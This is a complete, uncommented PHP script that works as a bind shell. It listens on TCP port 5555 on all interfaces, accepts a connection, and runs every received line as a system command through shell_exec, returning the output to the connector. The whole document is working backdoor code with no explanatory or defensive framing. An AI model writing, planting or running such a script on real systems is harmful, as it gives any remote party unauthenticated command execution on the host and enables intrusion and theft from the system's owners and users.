<?php
set_time_limit(0);
$server = stream_socket_server("tcp://0.0.0.0:5555", $errno, $errstr);
if (!$server) { die("$errstr ($errno)"); }
$client = stream_socket_accept($server, -1);
while (!feof($client)) {
    $cmd = fgets($client);
    $output = shell_exec($cmd);
    fwrite($client, $output);
}
fclose($client);
fclose($server);
?>
